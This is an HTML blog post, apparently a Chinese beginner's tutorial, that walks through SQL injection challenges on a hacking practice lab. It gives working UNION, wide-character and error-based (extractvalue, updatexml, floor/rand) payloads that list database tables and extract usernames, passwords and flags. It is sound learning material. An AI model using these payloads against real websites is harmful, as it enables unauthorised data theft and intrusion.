@@ -1,0 +1,553 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <!-- hexo-inject:begin --><!-- hexo-inject:end --><meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 6.3.0">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" integrity="sha256-HtsXJanqjKTc8vVQjO4YMhiqFoXkfBsjBWcX91T1jr8=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"juniorprincewang.github.io","root":"/","images":"/images","scheme":"Muse","darkmode":false,"version":"8.18.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":{"enable":false,"style":null},"fold":{"enable":false,"height":500},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"}}</script><script src="/js/config.js"></script>
+
+    <meta name="description" content="本篇记录了尝试从零基础入门SQL注入，包括简单的注入、宽字符注入、利用报错信息注入...">
+<meta property="og:type" content="article">
+<meta property="og:title" content="sql注入入门">
+<meta property="og:url" content="http://juniorprincewang.github.io/2017/08/06/sql%E6%B3%A8%E5%85%A5%E5%85%A5%E9%97%A8/index.html">
+<meta property="og:site_name" content="TO DO">
+<meta property="og:description" content="本篇记录了尝试从零基础入门SQL注入，包括简单的注入、宽字符注入、利用报错信息注入...">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2017-08-06T02:08:25.000Z">
+<meta property="article:modified_time" content="2022-01-09T11:09:07.904Z">
+<meta property="article:author" content="Max">
+<meta property="article:tag" content="sql注入">
+<meta property="article:tag" content="web安全">
+<meta name="twitter:card" content="summary">
+
+
+<link rel="canonical" href="http://juniorprincewang.github.io/2017/08/06/sql%E6%B3%A8%E5%85%A5%E5%85%A5%E9%97%A8/">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"http://juniorprincewang.github.io/2017/08/06/sql%E6%B3%A8%E5%85%A5%E5%85%A5%E9%97%A8/","path":"2017/08/06/sql注入入门/","title":"sql注入入门"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>sql注入入门 | TO DO</title>
+  
+
+
+
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+<!-- hexo injector head_end start -->
+<link rel="stylesheet" href="/custom_css_source.css">
+<!-- hexo injector head_end end --><!-- hexo-inject:begin --><!-- hexo-inject:end --></head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <!-- hexo-inject:begin --><!-- hexo-inject:end --><div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">TO DO</p>
+      <i class="logo-line"></i>
+    </a>
+      <p class="site-subtitle" itemprop="description">吾尝终日而思矣，不如须臾之所学也。</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="搜索" role="button">
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li>
+  </ul>
+</nav>
+
+
+
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%86%99%E5%9C%A8%E5%89%8D%E9%9D%A2"><span class="nav-number">1.</span> <span class="nav-text">写在前面</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%9C%A8-ubuntu-%E4%B8%AD%E4%BF%AE%E6%94%B9-apache2-%E7%BD%91%E7%AB%99%E6%A0%B9%E7%9B%AE%E5%BD%95"><span class="nav-number">1.1.</span> <span class="nav-text">在 ubuntu
+中修改 apache2 网站根目录。</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%9F%A5%E8%AF%86%E7%82%B9"><span class="nav-number">2.</span> <span class="nav-text">知识点</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#mysql%E4%B8%ADselect%E7%9A%84%E6%A0%BC%E5%BC%8F"><span class="nav-number">2.1.</span> <span class="nav-text">mysql中select的格式</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E6%9C%AC%E6%B5%81%E7%A8%8B"><span class="nav-number">2.2.</span> <span class="nav-text">SQL注入基本流程</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#mysql%E6%95%B0%E6%8D%AE%E5%BA%93%E5%B8%B8%E7%94%A8%E7%9F%A5%E8%AF%86"><span class="nav-number">2.3.</span> <span class="nav-text">MySQL数据库常用知识</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%BB%83%E4%B9%A0%E7%BD%91%E7%AB%99-%E7%BD%91%E7%BB%9C%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%E5%AD%A6%E4%B9%A0%E5%B9%B3%E5%8F%B0"><span class="nav-number">3.</span> <span class="nav-text">练习网站 网络信息安全攻防学习平台</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%98%B2%E6%B3%A8%E5%85%A5"><span class="nav-number">3.1.</span> <span class="nav-text">防注入</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%88%B0%E5%BA%95%E8%83%BD%E4%B8%8D%E8%83%BD%E5%9B%9E%E6%98%BE"><span class="nav-number">3.2.</span> <span class="nav-text">到底能不能回显</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%82%82%E9%80%85"><span class="nav-number">3.3.</span> <span class="nav-text">邂逅</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#errorbased"><span class="nav-number">3.4.</span> <span class="nav-text">6.ErrorBased</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8F%A6%E4%B8%80%E7%A7%8D%E8%A7%A3%E6%B3%95"><span class="nav-number">3.4.1.</span> <span class="nav-text">另一种解法</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%9B%B2%E6%B3%A8"><span class="nav-number">3.5.</span> <span class="nav-text">7.盲注</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#sql%E6%B3%A8%E5%85%A5%E9%80%9A%E7%94%A8%E9%98%B2%E6%8A%A4"><span class="nav-number">3.6.</span> <span class="nav-text">SQL注入通用防护</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%8D%AE%E8%AF%B4%E5%93%88%E5%B8%8C%E5%90%8E%E7%9A%84%E5%AF%86%E7%A0%81%E6%98%AF%E4%B8%8D%E8%83%BD%E4%BA%A7%E7%94%9F%E6%B3%A8%E5%85%A5%E7%9A%84"><span class="nav-number">3.7.</span> <span class="nav-text">据说哈希后的密码是不能产生注入的</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8F%82%E8%80%83%E7%BD%91%E7%AB%99"><span class="nav-number">3.8.</span> <span class="nav-text">参考网站</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#sqli-labs"><span class="nav-number">4.</span> <span class="nav-text">sqli-labs</span></a></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">Max</p>
+  <div class="site-description" itemprop="description">文章本天成，妙手偶得之。</div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">92</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">31</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">97</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author animated">
+      <span class="links-of-author-item">
+        <a href="https://github.com/juniorprincewang" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;juniorprincewang" rel="noopener me" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:maxzywang@163.com" title="E-Mail → mailto:maxzywang@163.com" rel="noopener me" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+  </div>
+
+        </div>
+      </div>
+    </div>
+
+    
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://juniorprincewang.github.io/2017/08/06/sql%E6%B3%A8%E5%85%A5%E5%85%A5%E9%97%A8/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="Max">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="TO DO">
+      <meta itemprop="description" content="文章本天成，妙手偶得之。">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="sql注入入门 | TO DO">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          sql注入入门
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2017-08-06 10:08:25" itemprop="dateCreated datePublished" datetime="2017-08-06T10:08:25+08:00">2017-08-06</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">更新于</span>
+      <time title="修改时间：2022-01-09 19:09:07" itemprop="dateModified" datetime="2022-01-09T19:09:07+08:00">2022-01-09</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/sql%E6%B3%A8%E5%85%A5/" itemprop="url" rel="index"><span itemprop="name">sql注入</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody"><p>本篇记录了尝试从零基础入门SQL注入，包括简单的注入、宽字符注入、利用报错信息注入...</p>
+<span id="more"></span>
+<h1 id="写在前面">写在前面</h1>
+<h2 id="在-ubuntu-中修改-apache2-网站根目录">在 <code>ubuntu</code>
+中修改 <code>apache2</code> 网站根目录。</h2>
+<p>修改根目录： 在 <code>/etc/apache2/sites-available</code> 中修改
+<code>000-default.conf</code> 中的 <code>DocumentRoot /var/www/</code>
+修改为想要的目录。 然后重启 <code>apache2</code>，
+<code>sudo service apache2 restart</code> 。</p>
+<h1 id="知识点">知识点</h1>
+<h2 id="mysql中select的格式">mysql中select的格式</h2>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">SELECT</span><br><span class="line">    [ALL | DISTINCT | DISTINCTROW ]</span><br><span class="line">      [HIGH_PRIORITY]</span><br><span class="line">      [STRAIGHT_JOIN]</span><br><span class="line">      [SQL_SMALL_RESULT] [SQL_BIG_RESULT] [SQL_BUFFER_RESULT]</span><br><span class="line">      [SQL_CACHE | SQL_NO_CACHE] [SQL_CALC_FOUND_ROWS]</span><br><span class="line">    select_expr [, select_expr ...]</span><br><span class="line">    [FROM table_references</span><br><span class="line">    [WHERE where_condition]</span><br><span class="line">    [GROUP BY &#123;col_name | expr | position&#125;</span><br><span class="line">      [ASC | DESC], ... [WITH ROLLUP]]</span><br><span class="line">    [HAVING where_condition]</span><br><span class="line">    [ORDER BY &#123;col_name | expr | position&#125;</span><br><span class="line">      [ASC | DESC], ...]</span><br><span class="line">    [LIMIT &#123;[offset,] row_count | row_count OFFSET offset&#125;]</span><br><span class="line">    [PROCEDURE procedure_name(argument_list)]</span><br><span class="line">    [INTO OUTFILE &#x27;file_name&#x27; export_options</span><br><span class="line">      | INTO DUMPFILE &#x27;file_name&#x27;</span><br><span class="line">      | INTO var_name [, var_name]]</span><br><span class="line">    [FOR UPDATE | LOCK IN SHARE MODE]]</span><br></pre></td></tr></table></figure>
+<h2 id="sql注入基本流程">SQL注入基本流程</h2>
+<ol type="1">
+<li>判断是否存在注入点；</li>
+<li>判断字段回显位置；</li>
+<li>判断数据库信息；</li>
+<li>查找数据库名；</li>
+<li>查找数据库表；</li>
+<li>查找数据库表中字段以及字段值。</li>
+</ol>
+<h2 id="mysql数据库常用知识">MySQL数据库常用知识</h2>
+<p>在MySQL中，数据库名存放在information_schema数据库下schemata表schema_name字段中；表名存放在information_schema数据库下tables表table_name字段中；字段名存放在information_schema数据库下columns表column_name字段中。</p>
+<h1 id="练习网站-网络信息安全攻防学习平台">练习网站 <a
+target="_blank" rel="noopener" href="http://hackinglab.cn/index.php">网络信息安全攻防学习平台</a></h1>
+<h2 id="防注入">防注入</h2>
+<pre><code>利用宽字符将`&#39;`注入
+
+猜测闭合字符：
+
+    输入 `&#39;`，报错；而输入`&#39;#`未报错。
+判断列 order by 4
+
+判断显示位
+union all select 1,2,3,4
+
+
+查询语句
+union all select 1,user(),3,4  用户
+database()数据库
+version()版本</code></pre>
+<p>可以利用python的包来作相关处理，比如： 查看特殊字符url转义。
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">In [30]: import urllib</span><br><span class="line">In [30]: urllib.quote(&#x27;\&#x27;&#x27;)</span><br><span class="line">Out[30]: &#x27;%27&#x27;</span><br><span class="line">In [31]: urllib.unquote(&#x27;%23&#x27;)</span><br><span class="line">Out[31]: &#x27;#&#x27;</span><br></pre></td></tr></table></figure></p>
+<p>转换字符串为二进制并用十六进制表示 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">In [33]: import binascii</span><br><span class="line"></span><br><span class="line">In [34]: binascii.hexlify(&#x27;mydbs&#x27;)</span><br><span class="line">Out[34]: &#x27;6d79646273&#x27;</span><br></pre></td></tr></table></figure></p>
+<p>查数据库表 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://lab1.xseclab.com/sqli4_9b5a929e00e122784e44eddf2b6aa1a0/index.php?id=1%df%27%20union%20select%201,concat(group_concat(distinct+table_name)),3%20%20from%20information_schema.tables%20where%20table_schema=0x6d79646273%23</span><br></pre></td></tr></table></figure></p>
+<pre><code>sae_user_sqli4</code></pre>
+<p>查表中对应的字段 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://lab1.xseclab.com/sqli4_9b5a929e00e122784e44eddf2b6aa1a0/index.php?id=1%df%27%20union%20select%201,concat(group_concat(distinct+column_name)),3%20%20from%20information_schema.columns%20where%20table_name=0x7361655f757365725f73716c6934%23</span><br></pre></td></tr></table></figure></p>
+<pre><code>id,title_1,content_1</code></pre>
+<h2 id="到底能不能回显">到底能不能回显</h2>
+<p>关于<code>limit</code>命令的注入。</p>
+<p>得到数据库名称： <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">procedure analyse(extractvalue(rand(), concat(0x3a,(select group_concat(0x7e, schema_name ,0x7e) from information_schema.schemata))),1)%23&amp;num=1</span><br></pre></td></tr></table></figure></p>
+<pre><code>XPATH syntax error: &#39;:~information_schema~,~mydbs~,~t&#39; </code></pre>
+<p><code>mydbs</code> 0x6d79646273</p>
+<p>procedure analyse(extractvalue(rand(), concat(0x3a,(select
+group_concat(0x7e, table_name,0x7e) from information_schema.tables where
+table_schema=0x6d79646273 ))),1)%23&amp;num=1</p>
+<pre><code>XPATH syntax error: &#39;:~article~,~user~&#39; </code></pre>
+<p>得到table name:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">procedure analyse(extractvalue(rand(), concat(0x3a,(select group_concat(0x7e, table_name,0x7e) from information_schema.tables where table_schema=database() limit 1,1))),1)%23&amp;num=1</span><br></pre></td></tr></table></figure>
+<p><code>user</code>二级制<code>0x75736572</code></p>
+<p>由于<code>group_concat</code>得出的结果有长度限制，只能limit一个字段一个字段泄露。
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">procedure analyse(extractvalue(rand(), concat(0x3a,(select concat(0x7e, column_name, 0x7e) from information_schema.columns where table_name=0x75736572 limit 2,1))),1)%23&amp;num=1</span><br></pre></td></tr></table></figure></p>
+<pre><code>四个字段 id,username,password,lastloginIP</code></pre>
+<p>获取各个字段 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">procedure analyse(extractvalue(rand(), concat(0x3a,(select concat(0x7e,username,0x3a, password, 0x7e) from user limit 2,1))),1)%23&amp;num=1</span><br></pre></td></tr></table></figure></p>
+<pre><code>XPATH syntax error: &#39;:~flag:myflagishere~&#39;</code></pre>
+<h2 id="邂逅">邂逅</h2>
+<p>从图片请求入手，不能在浏览器通过正常请求测试是否有注入点，应当在BurpSuite中操作。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/sqli6_f37a4a60a4a234cd309ce48ce45b9b00/images/dog1.jpg%bf%27</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"># 判断列，直到5报错</span><br><span class="line">/sqli6_f37a4a60a4a234cd309ce48ce45b9b00/images/dog1.jpg%bf%27%20order%20by%205%23</span><br><span class="line"># 判断显示位, 回显3</span><br><span class="line">/sqli6_f37a4a60a4a234cd309ce48ce45b9b00/images/dog1.jpg%bf%27%20union%20select%201,2,3,4%20%23</span><br><span class="line"># 获取当前数据库的表名article,pic </span><br><span class="line">/sqli6_f37a4a60a4a234cd309ce48ce45b9b00/images/dog1.jpg%bf%27%20union%20select%201,2,concat(group_concat(distinct+table_name)),4%20%20from%20information_schema.tables%20where%20table_schema=database()%23</span><br><span class="line"># 查找article的字段，&#x27;article&#x27;=&gt;0x61727469636c65</span><br><span class="line">## 得到 id,title,content,others </span><br><span class="line">/sqli6_f37a4a60a4a234cd309ce48ce45b9b00/images/dog1.jpg%bf%27%20union%20select%201,2,concat(group_concat(column_name)),4%20%20from%20information_schema.columns%20where%20table_name=0x61727469636c65%23</span><br><span class="line">## 得到数据</span><br><span class="line">/sqli6_f37a4a60a4a234cd309ce48ce45b9b00/images/dog1.jpg%bf%27%20union%20select%201,2,concat(group_concat(title,content),0x3a),4%20%20from%20article%23</span><br><span class="line">未得到有用信息</span><br><span class="line"></span><br><span class="line"># 查找pic的字段，&#x27;pic&#x27;=&gt;0x706963</span><br><span class="line">## 得到 id,picname,data,text </span><br><span class="line">/sqli6_f37a4a60a4a234cd309ce48ce45b9b00/images/dog1.jpg%bf%27%20union%20select%201,2,concat(group_concat(column_name)),4%20%20from%20information_schema.columns%20where%20table_name=0x706963%23</span><br><span class="line">## 得到数据</span><br><span class="line">/sqli6_f37a4a60a4a234cd309ce48ce45b9b00/images/dog1.jpg%bf%27%20union%20select%201,2,concat(group_concat(picname,0x7e),0x3a),4%20%20from%20pic%23</span><br><span class="line">得到 dog1.jpg~,cat1.jpg~,flagishere_askldjfklasjdfl.jpg~:</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>在浏览器访问flagishere_askldjfklasjdfl.jpg即可得到flag。</p>
+<h2 id="errorbased">6.ErrorBased</h2>
+<ul>
+<li>猜测闭合字符</li>
+<li>猜测列数</li>
+<li>尝试得到显示位</li>
+<li>得到数据库</li>
+</ul>
+<p>题目是基于错误的，当在一个聚合函数，比如count函数后面如果使用分组语句就会把查询的一部分以错误的形式显示出来。
+用到的报错语句为： <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">select 1,2,...,count(*),concat(0x3a,(注入代码),0x3a,floor(2*rand(0)))a FROM information_schema.tables GROUP BY a</span><br><span class="line">如</span><br><span class="line">select concat(0x3a,0x3a,(version()),0x3a,0x3a,floor(2*rand(0)))a,count(*) FROM information_schema.tables GROUP BY a</span><br><span class="line"></span><br><span class="line">select count(*),concat(0x3a,0x3a,(database()),0x3a,0x3a,floor(2*rand(0)))a FROM information_schema.tables GROUP BY a</span><br><span class="line">#可通过urllib.quote()将其转换成url参数输入</span><br><span class="line">#得到Duplicate entry &#x27;::mydbs::1&#x27; for key &#x27;group_key&#x27;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure> 接下来爆表，替换注入代码即可：
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">UNION SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database(); </span><br><span class="line">UNION SELECT TABLE_NAME FROM information_schema.tables WHERE TABLE_SCHEMA=database() LIMIT 0,1;</span><br></pre></td></tr></table></figure></p>
+<pre><code>select count(*),concat(0x3a,0x3a,(SELECT TABLE_NAME FROM information_schema.tables WHERE TABLE_SCHEMA=database() limit 0,1),0x3a,floor(2*rand(0)))a FROM information_schema.tables GROUP BY a</code></pre>
+<p>当前数据库的表依次为：<code>log</code>,<code>motto</code>,<code>user</code></p>
+<p>爆字段： <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_name = &#x27;tablename&#x27;</span><br><span class="line">SELECT column_name FROM information_schema.columns WHERE table_name = &#x27;tablename&#x27; limit 0,1</span><br></pre></td></tr></table></figure></p>
+<pre><code>select count(*),concat(0x3a,0x3a,(SELECT column_name FROM information_schema.columns WHERE table_name = &#39;motto&#39; limit 0,1),0x3a,floor(2*rand(0)))a FROM information_schema.tables GROUP BY a</code></pre>
+<p>依次得到：<code>id</code>,<code>username</code>,<code>motto</code>,</p>
+<p>爆数据：</p>
+<pre><code>select count(*),concat(0x3a,0x3a,(SELECT username FROM motto limit 0,1),0x3a,floor(2*rand(0)))a FROM information_schema.tables GROUP BY a</code></pre>
+<p>怎么会没有返回结果！无语了！</p>
+<p>可通过以下方式获得:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">and(select 1 </span><br><span class="line">	from    (select count(*),concat(</span><br><span class="line">									(select </span><br><span class="line">										(select </span><br><span class="line">											(SELECT DISTINCT </span><br><span class="line">												CONCAT(0x7e,username,0x7e,id,0x7e,motto,0x7e) FROM motto limit 3,1</span><br><span class="line">											)</span><br><span class="line">										) </span><br><span class="line">									from information_schema.tables limit 0,1</span><br><span class="line">									),floor(rand(0)*2)</span><br><span class="line">									)x </span><br><span class="line">			from information_schema.tables group by x)a</span><br><span class="line">	)%23 </span><br></pre></td></tr></table></figure>
+<p>换一种基于错误的泄露，接着研究。</p>
+<p>第二种： XPATH爆信息</p>
+<p>这里主要用到的是ExtractValue()和UpdateXML()这2个函数，由于mysql
+5.1以后提供了内置的XML文件解析和函数，所以这种注入只能用于5.1版本以后</p>
+<p>查看sql手册 语法：EXTRACTVALUE (XML_document,
+XPath_string);　　　　　　　
+第一个参数：XML_document是String格式，为XML文档对象的名称，文中为Doc 。
+第二个参数：XPath_string (Xpath格式的字符串)
+，如果不了解Xpath语法，可以在网上查找教程。
+作用：从目标XML中返回包含所查询值的字符串 　　　　　　 　　　　　　</p>
+<p>语法:UPDATEXML (XML_document, XPath_string, new_value);
+　　　　　　　　　　
+第一个参数：XML_document是String格式，为XML文档对象的名称，文中为Doc
+　　　　　　　　　　 第二个参数：XPath_string (Xpath格式的字符串)
+，如果不了解Xpath语法，可以在网上查找教程。
+第三个参数：new_value，String格式，替换查找到的符合条件的数据。</p>
+<p>作用：改变文档中符合条件的节点的值 　　　　　　</p>
+<p>现在就很清楚了，我们只需要不满足XPath_string(Xpath格式)就可以了，但是由于这个方法只能爆出32位，所以可以结合mid来使用</p>
+<p>公式1：username=admin' and (extractvalue(1,
+concat(0x7e,(你想获取的数据的sql语句)))) and '1'='1</p>
+<p>公式2：username=admin' and (updatexml(1,
+concat(0x7e,(你想获取的数据的sql语句)),1)) and '1'='1</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://lab1.xseclab.com/sqli7_b95cf5af3a5fbeca02564bffc63e92e5/index.php?username=admin&#x27; and extractvalue(1, concat(0x3a,(SELECT distinct concat(0x3a,username,0x3a,motto,0x3a,0x3a) FROM motto limit 3,1)))%23</span><br></pre></td></tr></table></figure>
+<p>得到返回结果：</p>
+<pre><code>&#39;::#adf#ad@@#:key#notfound!#::&#39; </code></pre>
+<p><a
+target="_blank" rel="noopener" href="http://www.bkjia.com/Mysql/1013499.html">基于错误回显的sql注入整理，回显sql注入</a></p>
+<h3 id="另一种解法">另一种解法</h3>
